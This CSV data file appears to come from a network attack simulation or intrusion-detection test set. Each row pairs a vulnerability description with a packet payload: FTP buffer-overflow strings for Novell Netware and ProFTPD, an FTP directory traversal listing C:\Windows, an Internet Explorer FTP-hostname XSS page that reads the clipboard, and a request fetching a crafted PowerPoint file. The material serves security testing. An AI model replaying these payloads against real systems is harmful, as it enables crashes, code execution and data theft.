XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,USER admin||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,PASS foobar||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,MKD ~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,220 Service Ready for new User||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,331 Password Needed for Login||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,230 User admin Logged in Successfully||0D 0A||
FSC20100330-01_Novell_Netware_FTP_Server_Remote_Stack_Buffer_Overflow.xml,Novell Netware FTP Server Remote Stack Buffer Overflow,"A buffer overflow vulnerability exists in Novell Netware. The vulnerability is due to a boundary error in NWFTPD.nlm when processing the MKD and RMD FTP commands. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server. In attack scenarios where code execution is successful the behaviour of the affected server depends entirely on the intention of the injected code, which will be executed within the security context of the affected service.",FTP,TCP,550 Could not create directory ||22 ||/sys/public/~aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa||08 22 0D 0A||
﻿FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||FF ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
FSC20101101-06_ProFTPD_FTP_Server_TELNET_IAC_Stack_Buffer_Overflow.xml,ProFTPD FTP Server TELNET_IAC Stack Buffer Overflow,"ProFTPD FTP Server is vulnerable to a stack based buffer overflow. The vulnerability is due to insufficient validation when processing user input, if a TELNET_IAC escape sequence is received, the server will miscalculate the required length of a stack buffer.A remote attacker could exploit this vulnerability to execute arbitrary code in the security context of the FTP process or daemon. Unsuccessful attempts may terminate the FTP worker process unexpectedly. Since a separate worker process is spawned for each connection, a crash will not lead to any kind of denial of service condition.",FTP,TCP,220 FTP Server ready.||0D 0A||
﻿FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,USER admin||0D 0A||
FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,PASS foobar||0D 0A||
FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,DELE ?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A||
FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,220 Service Ready for new User||0D 0A||
FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,331 Password Needed for Login||0D 0A||
FSC20110321-05_Novell_Netware_FTP_Server_DELE_Command_Stack_Buffer_Overflow.xml,Novell Netware FTP Server DELE Command Stack Buffer Overflow,"A code execution vulnerability exists in Novell Netware. The vulnerability is due to a stack buffer overflow in NWFTPD.NLM when processing DELE FTP requests. Remote authenticated attackers can exploit this vulnerability by sending maliciously crafted commands to the affected server.In attack scenarios where code execution is successful the behaviour of the affected server depends entirely onthe logic of the injected code, which will be executed within the security context of the affected service. In situationswhere code execution is not successful the affected service may terminate abnormally, causing a denial of servicecondition.",FTP,TCP,230 User admin Logged in Successfully||0D 0A||
﻿FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,USER test||0A||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,PASS test||0A||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,TYPE A||0A||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,"PORT 10,1,1,1,128,71||0A||"
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,LIST C||3A ||\Windows\||0A||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,QUIT||0A||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
FTP_Windows_Listing.xml,FTP C\:\\Windows\\ listing,This threat attempts to list the C:\Windows directory via FTP.  This is a common flaw in many FTP servers that do not check to make sure the directory specified is inside the FTP root.  FTP typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿InternetExplorerFTPXSS.xml,Microsoft Internet Explorer FTP XSS attempt,This threat attempts to execute Javascript locally by supplying a bad FTP hostname containing Javascript.  Can be used to gain control of the user through the web browser.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerFTPXSS.xml,Microsoft Internet Explorer FTP XSS attempt,This threat attempts to execute Javascript locally by supplying a bad FTP hostname containing Javascript.  Can be used to gain control of the user through the web browser.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 18||3A ||41||3A ||07 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 18||3A ||40||3A ||05 GMT||0D 0A ||ETag||3A || ||22 ||11c9e-91-fd368b40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 145||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<HTML>||0A ||<BODY>||0A ||<a HREF=||22 ||ftp||3A ||//%22%3e%3cscript%3ealert(clipboard%44ata.get%44ata(%22%54ext%22))%3b%3c%2fscript%3E%20||22 ||>click me</a>||0A ||</BODY>||0A ||</HTML>||0A||"
﻿TSL20090512-09_MicrosoftPowerPoint_LegacyFormat_SchemesRecord_BufferOverflow.xml,Microsoft Office PowerPoint Legacy Format Schemes Record Buffer Overflow,"A buffer overflow vulnerability exists in Microsoft Office PowerPoint. The flaw is due to a boundary error when
processing crafted legacy PowerPoint (PPT) documents. An attacker could exploit this vulnerability by persuading
the target user to open a specially crafted legacy PowerPoint document.
In  an  attack  case  where  code  injection  is  successful,  the  behaviour  of  the  target  is  entirely  dependent  on  the
intended function of the injected code. The injected code in such a case would execute within the security context
of the logged in user. In an attack case where code injection is not successful, the affected application will terminate
abnormally, potentially resulting in loss of unsaved data.","FTP,HTTP,HTTPS,IMAP,POP3,SMB/CIFS,SMTP",TCP,"GET /~mbohio/poc.ppt HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1||3B || .NET CLR 2.0.50727||3B || .NET CLR 3.0.4506.2152||3B || .NET CLR 3.5.30729)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
